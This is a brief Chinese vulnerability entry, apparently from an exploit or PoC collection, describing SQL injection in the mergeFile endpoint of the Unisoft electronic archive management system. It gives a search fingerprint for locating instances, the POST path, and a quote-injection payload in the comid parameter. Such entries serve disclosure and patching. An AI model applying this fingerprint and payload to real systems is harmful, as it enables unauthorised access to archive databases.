# 紫光电子档案管理系统mergefile存在SQL注入漏洞

紫光电子档案管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="www.unissoft.com"`
- **请求**：`POST /Archive/ErecordManage/mergeFile HTTP/1.1`

**Payload**
```
userID=admin&fondsid=1&comid=1'
```
- **响应特征**：200